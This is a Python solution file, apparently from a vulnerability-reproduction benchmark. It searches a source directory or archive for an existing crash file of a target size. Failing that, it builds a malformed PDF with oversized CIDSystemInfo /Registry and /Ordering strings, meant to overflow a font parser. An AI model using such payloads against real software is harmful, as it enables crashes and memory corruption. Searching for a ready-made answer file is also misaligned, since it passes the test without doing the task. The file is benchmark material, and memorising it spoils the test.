import os
import io
import re
import tarfile
import zipfile
from pathlib import Path
from typing import Optional, Tuple, List


class Solution:
    TARGET_LEN = 80064

    def solve(self, src_path: str) -> bytes:
        path = Path(src_path)

        # 1) If a directory is given, search inside it
        if path.exists() and path.is_dir():
            data = self._search_directory_for_poc(path)
            if data is not None:
                return data

        # 2) If a tar archive is given, search inside it
        if path.exists() and path.is_file():
            # Try TAR first (handles .tar, .tar.gz, .tgz, etc.)
            try:
                if tarfile.is_tarfile(str(path)):
                    data = self._search_tar_for_poc(path)
                    if data is not None:
                        return data
            except Exception:
                pass

            # Try ZIP
            try:
                if zipfile.is_zipfile(str(path)):
                    data = self._search_zip_for_poc(path)
                    if data is not None:
                        return data
            except Exception:
                pass

        # 3) Fallback: generate a crafted payload with CIDSystemInfo and large Registry/Ordering
        return self._generate_fallback_payload(self.TARGET_LEN)

    # ---------- Directory scanning ----------
    def _search_directory_for_poc(self, root: Path) -> Optional[bytes]:
        # Stage 1: exact size match fast path
        exact_candidates: List[Path] = []
        try:
            for dirpath, _, filenames in os.walk(root):
                for fn in filenames:
                    fp = Path(dirpath) / fn
                    try:
                        size = fp.stat().st_size
                    except Exception:
                        continue
                    if size == self.TARGET_LEN:
                        exact_candidates.append(fp)
            # Prefer typical extensions and names
            best = self._pick_best_exact_match_paths(exact_candidates)
            if best is not None:
                try:
                    return best.read_bytes()
                except Exception:
                    pass
        except Exception:
            pass

        # Stage 2: heuristic search for near matches
        best_path, _ = self._heuristic_search_dir(root)
        if best_path is not None:
            try:
                return Path(best_path).read_bytes()
            except Exception:
                pass

        return None

    def _pick_best_exact_match_paths(self, paths: List[Path]) -> Optional[Path]:
        if not paths:
            return None
        # Score based on file name keywords and extension
        best_score = float("-inf")
        best_path: Optional[Path] = None
        for p in paths:
            score = self._score_name_and_ext(str(p), self.TARGET_LEN, exact=True)
            if score > best_score:
                best_score = score
                best_path = p
        return best_path

    def _heuristic_search_dir(self, root: Path) -> Tuple[Optional[str], int]:
        best_score = float("-inf")
        best_path: Optional[str] = None
        try:
            for dirpath, _, filenames in os.walk(root):
                for fn in filenames:
                    fp = Path(dirpath) / fn
                    try:
                        size = fp.stat().st_size
                    except Exception:
                        continue
                    score = self._score_name_and_ext(str(fp), size, exact=False)
                    if score > best_score:
                        best_score = score
                        best_path = str(fp)
        except Exception:
            pass
        return best_path, int(best_score) if best_path is not None else 0

    # ---------- TAR scanning ----------
    def _search_tar_for_poc(self, tar_path: Path) -> Optional[bytes]:
        try:
            with tarfile.open(tar_path, "r:*") as tf:
                # Stage 1: exact size match
                exact_members = []
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    if m.size == self.TARGET_LEN:
                        exact_members.append(m)
                best_member = self._pick_best_exact_tar_member(exact_members)
                if best_member is not None:
                    f = tf.extractfile(best_member)
                    if f:
                        return f.read()

            with tarfile.open(tar_path, "r:*") as tf:
                # Stage 2: heuristic search
                best_score = float("-inf")
                best_m: Optional[tarfile.TarInfo] = None
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    score = self._score_name_and_ext(m.name, m.size, exact=False)
                    if score > best_score:
                        best_score = score
                        best_m = m
                if best_m is not None:
                    f = tf.extractfile(best_m)
                    if f:
                        return f.read()
        except Exception:
            pass
        return None

    def _pick_best_exact_tar_member(self, members: List[tarfile.TarInfo]) -> Optional[tarfile.TarInfo]:
        if not members:
            return None
        best_score = float("-inf")
        best: Optional[tarfile.TarInfo] = None
        for m in members:
            score = self._score_name_and_ext(m.name, m.size, exact=True)
            if score > best_score:
                best_score = score
                best = m
        return best

    # ---------- ZIP scanning ----------
    def _search_zip_for_poc(self, zip_path: Path) -> Optional[bytes]:
        try:
            with zipfile.ZipFile(zip_path, "r") as zf:
                # Stage 1: exact size match
                exact_infos = []
                for info in zf.infolist():
                    if info.is_dir():
                        continue
                    if info.file_size == self.TARGET_LEN:
                        exact_infos.append(info)
                best_info = self._pick_best_exact_zip_info(exact_infos)
                if best_info is not None:
                    with zf.open(best_info, "r") as f:
                        return f.read()

            with zipfile.ZipFile(zip_path, "r") as zf:
                # Stage 2: heuristic search
                best_score = float("-inf")
                best_info: Optional[zipfile.ZipInfo] = None
                for info in zf.infolist():
                    if info.is_dir():
                        continue
                    score = self._score_name_and_ext(info.filename, info.file_size, exact=False)
                    if score > best_score:
                        best_score = score
                        best_info = info
                if best_info is not None:
                    with zf.open(best_info, "r") as f:
                        return f.read()
        except Exception:
            pass
        return None

    def _pick_best_exact_zip_info(self, infos: List[zipfile.ZipInfo]) -> Optional[zipfile.ZipInfo]:
        if not infos:
            return None
        best_score = float("-inf")
        best: Optional[zipfile.ZipInfo] = None
        for info in infos:
            score = self._score_name_and_ext(info.filename, info.file_size, exact=True)
            if score > best_score:
                best_score = score
                best = info
        return best

    # ---------- Scoring helpers ----------
    def _score_name_and_ext(self, name: str, size: int, exact: bool) -> int:
        # Base score for size proximity
        diff = abs(size - self.TARGET_LEN)
        score = 0

        # Heavily reward exact size matches
        if size == self.TARGET_LEN:
            score += 100000

        # Size proximity
        score += max(0, 5000 - min(diff, 5000))

        lname = name.lower()

        # Extension weights
        ext_weight = self._ext_weight(lname)
        score += ext_weight

        # Keyword bonuses
        score += self._keyword_bonus(lname)

        # Directory hints
        dir_hints = ["poc", "fuzz", "clusterfuzz", "oss-fuzz", "crash", "tests", "inputs", "corpus"]
        for hint in dir_hints:
            if hint in lname:
                score += 50

        # Content-likelihood hints based on CID/CMap
        cid_hints = ["cid", "cmap", "type0", "cidfont", "adobe", "registry", "ordering"]
        for hint in cid_hints:
            if hint in lname:
                score += 60

        # Slightly reduce score for obviously unrelated types
        unrelated = [".c", ".h", ".cc", ".cpp", ".java", ".py", ".md", ".txt", ".html", ".png", ".jpg", ".jpeg", ".gif", ".bmp", ".svg"]
        for u in unrelated:
            if lname.endswith(u):
                score -= 200

        # Slight preference if exact search stage
        if exact:
            score += 1000

        return int(score)

    def _ext_weight(self, lname: str) -> int:
        ext_map = {
            ".pdf": 700,
            ".ps": 650,
            ".cff": 600,
            ".otf": 600,
            ".ttf": 600,
            ".pfa": 580,
            ".pfb": 580,
            ".cmap": 550,
            ".bin": 200,
            ".dat": 150,
        }
        for ext, w in ext_map.items():
            if lname.endswith(ext):
                return w
        return 0

    def _keyword_bonus(self, lname: str) -> int:
        bonus = 0
        kw = {
            "poc": 500,
            "crash": 400,
            "cid": 300,
            "cmap": 300,
            "cidfont": 300,
            "registry": 250,
            "ordering": 250,
            "buffer": 200,
            "overflow": 200,
            "min": 100,
            "repro": 150,
        }
        for k, w in kw.items():
            if k in lname:
                bonus += w
        return bonus

    # ---------- Fallback generator ----------
    def _generate_fallback_payload(self, total_len: int) -> bytes:
        # Generate a payload that contains a very long CIDSystemInfo /Registry and /Ordering
        # strings, which are related to the described vulnerability.
        header = b"%PDF-1.4\n% PoC generated\n1 0 obj\n<< /Type /Font /Subtype /CIDFontType0 >>\nstream\n"
        csi_prefix = b"/CIDSystemInfo << /Registry ("
        csi_middle = b") /Ordering ("
        csi_suffix = b") /Supplement 0 >>\nendstream\nendobj\ntrailer\n<< >>\n%%EOF\n"

        fixed = len(header) + len(csi_prefix) + len(csi_middle) + len(csi_suffix)
        if total_len <= fixed + 2:
            # Fallback minimal content
            return b"CIDSystemInfo /Registry (A) /Ordering (B)\n"

        remaining = total_len - fixed

        # Split remaining roughly evenly between Registry and Ordering
        reg_len = remaining // 2
        ord_len = remaining - reg_len

        registry = b"A" * reg_len
        ordering = b"B" * ord_len

        payload = b"".join([header, csi_prefix, registry, csi_middle, ordering, csi_suffix])

        # Adjust to exact length if slightly off due to calculations
        if len(payload) < total_len:
            payload += b"\n" * (total_len - len(payload))
        elif len(payload) > total_len:
            payload = payload[:total_len]

        return payload